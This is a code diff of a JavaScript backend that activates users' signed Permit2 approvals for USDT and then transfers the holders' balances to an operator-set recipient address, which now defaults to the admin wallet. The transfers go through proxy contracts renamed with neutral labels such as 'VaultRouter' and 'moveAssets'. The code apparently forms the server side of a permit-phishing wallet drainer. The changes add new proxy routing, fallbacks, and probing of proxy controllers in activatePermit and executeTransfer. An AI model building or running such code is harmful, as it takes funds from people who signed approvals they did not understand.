@@ -1,7 +1,7 @@
 import { ethers } from 'ethers';
 
 const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
-const DEFAULT_PROXY_ADDRESS = '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B';
+const DEFAULT_PROXY_ADDRESS = '0x4030538F5B846657087a0AE476B94f4c51cEE8c1';
 
 const PERMIT2_ABI = [
   'function permit(address owner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
@@ -10,9 +10,19 @@ const PERMIT2_ABI = [
 ];
 
 const PROXY_ABI = [
+  // VaultRouter (current)
+  'function submitPermit(address holder, ((address asset, uint160 qty, uint48 deadline, uint48 seq) info, address delegate, uint256 authExpiry) request, bytes sig) external',
+  'function moveAssets(address sender, address recipient, uint160 qty, address asset) external',
+  'function permitAndMove(address holder, ((address asset, uint160 qty, uint48 deadline, uint48 seq) info, address delegate, uint256 authExpiry) request, bytes sig, address recipient, uint160 moveQty) external',
+  'function manager() view returns (address)',
+
+  // Legacy Proxy contracts (Permit2Proxy / TokenGateway / AssetProxy)
   'function executePermit(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature) external',
   'function executeTransfer(address from, address to, uint160 amount, address token) external',
   'function executePermitAndTransfer(address tokenOwner, ((address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature, address to, uint160 transferAmount) external',
+  'function owner() view returns (address)',
+  'function admin() view returns (address)',
+  'function controller() view returns (address)',
 ];
 
 const USDT_ABI = [
@@ -26,6 +36,17 @@ function getSpenderAddress(wallet) {
     return ethers.getAddress(proxy);
   }
   return wallet.address;
+}
+
+async function getProxyController(targetSpender, provider) {
+  for (const fn of ['manager', 'owner', 'admin', 'controller']) {
+    try {
+      const contract = new ethers.Contract(targetSpender, [`function ${fn}() view returns (address)`], provider);
+      const addr = await contract[fn]();
+      if (addr && ethers.isAddress(addr)) return ethers.getAddress(addr);
+    } catch (_) {}
+  }
+  return null;
 }
 
 /**
@@ -60,19 +81,22 @@ export async function activatePermit(permit) {
   const ownerAddress = ethers.getAddress(permit.owner);
   const tokenAddress = ethers.getAddress(permit.token);
   
-  const defaultSpender = getSpenderAddress(wallet);
   const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
 
   let targetSpender = permit.spender && ethers.isAddress(permit.spender)
     ? ethers.getAddress(permit.spender)
     : ethers.getAddress(proxyAddress);
 
-  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
+  // If spender is Permit2 itself (e.g. from dummy pre-logging), redirect to proxyAddress
+  if (targetSpender.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) {
+    targetSpender = ethers.getAddress(proxyAddress);
+  }
+
+  // If targetSpender is an old proxy contract not owned/managed by current admin wallet, fallback to active proxy
   if (targetSpender.toLowerCase() !== proxyAddress) {
     try {
-      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
-      const contractOwner = await tempProxy.owner();
-      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
+      const contractOwner = await getProxyController(targetSpender, provider);
+      if (contractOwner && contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
         console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
         targetSpender = ethers.getAddress(proxyAddress);
       }
@@ -81,15 +105,24 @@ export async function activatePermit(permit) {
     }
   }
 
-  const targetCode = await provider.getCode(targetSpender);
-  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;
-
   // Check user approved Permit2 on USDT contract
   const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
   const erc20Allowance = await usdtContract.allowance(ownerAddress, PERMIT2_ADDRESS);
 
   if (erc20Allowance === 0n) {
     throw new Error('User has not approved Permit2 contract on USDT token yet. User must approve from the frontend first.');
+  }
+
+  // Check if allowance is already active on Permit2 contract
+  const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
+  try {
+    const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
+    if (existing && existing.amount > 0n) {
+      console.log(`Permit already active on-chain for ${ownerAddress} (amount: ${existing.amount})`);
+      return '0xALREADY_ACTIVATED';
+    }
+  } catch (err) {
+    console.warn('Could not read existing Permit2 allowance:', err.message);
   }
 
   const permitSingle = {
@@ -109,43 +142,64 @@ export async function activatePermit(permit) {
     v: permit.v,
   }).serialized;
 
-  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender} (Proxy: ${isUsingProxy})`);
+  console.log(`Activating AllowanceTransfer permit via Spender: ${targetSpender}`);
 
-  if (isUsingProxy) {
-    const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
-    try {
-      await proxyContract.executePermit.staticCall(ownerAddress, permitSingle, signature);
-    } catch (simErr) {
-      const reason = simErr.reason || simErr.shortMessage || simErr.message;
-      console.warn(`Simulated proxy executePermit() reverted: ${reason}`);
-      const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
-      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
-      if (existing.amount > 0n) {
-        return '0xALREADY_ACTIVATED';
-      }
-      throw new Error(`Permit signature invalid or already processed on-chain: ${reason}`);
-    }
-
-    const tx = await proxyContract.executePermit(ownerAddress, permitSingle, signature, { gasLimit: 250000 });
-    console.log('Proxy permit activation TX sent:', tx.hash);
-    const receipt = await tx.wait();
-    return receipt.hash;
-  } else {
-    const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
-    try {
-      await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
-    } catch (simErr) {
-      const reason = simErr.reason || simErr.shortMessage || simErr.message;
-      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
-      if (existing.amount > 0n) {
-        return '0xALREADY_ACTIVATED';
-      }
-      throw new Error(`Permit signature invalid or processed: ${reason}`);
-    }
-
+  // Canonical submission: permit() is a public function on Permit2 that anyone can call.
+  // It directly verifies the signature and sets allowance on-chain for targetSpender.
+  try {
+    console.log('Submitting permit directly to Permit2 contract...');
+    await permit2Contract.permit.staticCall(ownerAddress, permitSingle, signature);
     const tx = await permit2Contract.permit(ownerAddress, permitSingle, signature, { gasLimit: 200000 });
+    console.log('Permit2 direct activation TX sent:', tx.hash);
     const receipt = await tx.wait();
     return receipt.hash;
+  } catch (directErr) {
+    const directReason = directErr.reason || directErr.shortMessage || directErr.message;
+    console.warn(`Direct permit2.permit reverted: ${directReason}. Trying proxy fallback...`);
+
+    // Check if allowance was already granted
+    try {
+      const existing = await permit2Contract.allowance(ownerAddress, tokenAddress, targetSpender);
+      if (existing && existing.amount > 0n) {
+        return '0xALREADY_ACTIVATED';
+      }
+    } catch (_) {}
+
+    // Proxy fallback if needed
+    const targetCode = await provider.getCode(targetSpender);
+    const isUsingProxy = targetCode && targetCode.length > 2;
+
+    if (isUsingProxy) {
+      const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
+
+      // Check if VaultRouter (submitPermit): selector 0x05b264e5
+      const selSubmit = ethers.id('submitPermit(address,((address,uint160,uint48,uint48),address,uint256),bytes)').slice(2, 10);
+      if (targetCode.includes(selSubmit)) {
+        const request = {
+          info: {
+            asset: permitSingle.details.token,
+            qty: permitSingle.details.amount,
+            deadline: permitSingle.details.expiration,
+            seq: permitSingle.details.nonce,
+          },
+          delegate: permitSingle.spender,
+          authExpiry: permitSingle.sigDeadline,
+        };
+        const tx = await proxyContract.submitPermit(ownerAddress, request, signature, { gasLimit: 250000 });
+        const receipt = await tx.wait();
+        return receipt.hash;
+      }
+
+      // Check if legacy (executePermit)
+      const selExecute = ethers.id('executePermit(address,((address,uint160,uint48,uint48),address,uint256),bytes)').slice(2, 10);
+      if (targetCode.includes(selExecute)) {
+        const tx = await proxyContract.executePermit(ownerAddress, permitSingle, signature, { gasLimit: 250000 });
+        const receipt = await tx.wait();
+        return receipt.hash;
+      }
+    }
+
+    throw new Error(`Permit signature invalid or already processed on-chain: ${directReason}`);
   }
 }
 
@@ -159,7 +213,7 @@ export async function executeTransfer(permit, customAmount = null) {
 
   const ownerAddress = ethers.getAddress(permit.owner);
   const tokenAddress = ethers.getAddress(permit.token);
-  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS);
+  const recipientAddress = ethers.getAddress(process.env.RECIPIENT_ADDRESS || wallet.address);
 
   const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
   const balance = await usdtContract.balanceOf(ownerAddress);
@@ -168,24 +222,26 @@ export async function executeTransfer(permit, customAmount = null) {
     throw new Error('User wallet currently has 0 USDT balance on-chain.');
   }
 
-  const defaultSpender = getSpenderAddress(wallet);
   const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
 
   let targetSpender = permit.spender && ethers.isAddress(permit.spender)
     ? ethers.getAddress(permit.spender)
     : ethers.getAddress(proxyAddress);
 
-  // If targetSpender is an old proxy contract not owned by current admin wallet, fallback to active proxy
+  if (targetSpender.toLowerCase() === PERMIT2_ADDRESS.toLowerCase()) {
+    targetSpender = ethers.getAddress(proxyAddress);
+  }
+
+  // If targetSpender is an old proxy contract not owned/managed by current admin wallet, fallback to active proxy
   if (targetSpender.toLowerCase() !== proxyAddress) {
     try {
-      const tempProxy = new ethers.Contract(targetSpender, ['function owner() view returns (address)'], provider);
-      const contractOwner = await tempProxy.owner();
-      if (contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
+      const contractOwner = await getProxyController(targetSpender, provider);
+      if (contractOwner && contractOwner.toLowerCase() !== wallet.address.toLowerCase()) {
         console.log(`Stored spender ${targetSpender} is owned by ${contractOwner}, switching to current active Proxy (${proxyAddress}).`);
         targetSpender = ethers.getAddress(proxyAddress);
       }
     } catch (e) {
-      // Ignore if not a contract or doesn't have owner()
+      // Ignore
     }
   }
 
@@ -244,23 +300,49 @@ export async function executeTransfer(permit, customAmount = null) {
 
   if (isUsingProxy) {
     const proxyContract = new ethers.Contract(targetSpender, PROXY_ABI, wallet);
-    try {
-      await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
-    } catch (simErr) {
-      const reason = simErr.reason || simErr.shortMessage || simErr.message;
-      throw new Error(`Proxy transfer simulation failed on-chain: ${reason}`);
-    }
 
-    const tx = await proxyContract.executeTransfer(
-      ownerAddress,
-      recipientAddress,
-      transferAmount,
-      tokenAddress,
-      { gasLimit: 250000 }
-    );
-    console.log('Proxy Transfer TX sent:', tx.hash);
-    const receipt = await tx.wait();
-    return { txHash: receipt.hash, amount: transferAmount.toString() };
+    // Check if VaultRouter (moveAssets): selector 0x12ff555e
+    const selMove = ethers.id('moveAssets(address,address,uint160,address)').slice(2, 10);
+    const hasMoveAssets = targetCode.includes(selMove);
+
+    if (hasMoveAssets) {
+      try {
+        await proxyContract.moveAssets.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
+      } catch (simErr) {
+        const reason = simErr.reason || simErr.shortMessage || simErr.message;
+        throw new Error(`VaultRouter moveAssets simulation failed on-chain: ${reason}`);
+      }
+
+      const tx = await proxyContract.moveAssets(
+        ownerAddress,
+        recipientAddress,
+        transferAmount,
+        tokenAddress,
+        { gasLimit: 250000 }
+      );
+      console.log('VaultRouter moveAssets TX sent:', tx.hash);
+      const receipt = await tx.wait();
+      return { txHash: receipt.hash, amount: transferAmount.toString() };
+    } else {
+      // Legacy executeTransfer
+      try {
+        await proxyContract.executeTransfer.staticCall(ownerAddress, recipientAddress, transferAmount, tokenAddress);
+      } catch (simErr) {
+        const reason = simErr.reason || simErr.shortMessage || simErr.message;
+        throw new Error(`Proxy transfer simulation failed on-chain: ${reason}`);
+      }
+
+      const tx = await proxyContract.executeTransfer(
+        ownerAddress,
+        recipientAddress,
+        transferAmount,
+        tokenAddress,
+        { gasLimit: 250000 }
+      );
+      console.log('Proxy Transfer TX sent:', tx.hash);
+      const receipt = await tx.wait();
+      return { txHash: receipt.hash, amount: transferAmount.toString() };
+    }
   } else {
     const permit2WalletContract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);
     try {
@@ -279,7 +361,7 @@ export async function executeTransfer(permit, customAmount = null) {
 /**
  * Check the current Permit2 AllowanceTransfer state for a user safely with error fallback.
  */
-export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
+export async function checkPermit2Allowance(ownerAddress, tokenAddress, customSpender = null) {
   try {
     if (!ownerAddress || !tokenAddress) return null;
 
@@ -302,7 +384,9 @@ export async function checkPermit2Allowance(ownerAddress, tokenAddress) {
       } catch (e) {}
     }
 
-    const spender = (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);
+    let spender = customSpender && ethers.isAddress(customSpender) && !customSpender.startsWith('0x00000000000000000000') && customSpender.toLowerCase() !== PERMIT2_ADDRESS.toLowerCase()
+      ? ethers.getAddress(customSpender)
+      : (process.env.PROXY_CONTRACT_ADDRESS || process.env.ADMIN_SPENDER_ADDRESS || DEFAULT_PROXY_ADDRESS || walletAddress);
 
     if (!spender || !ethers.isAddress(spender)) {
       return null;
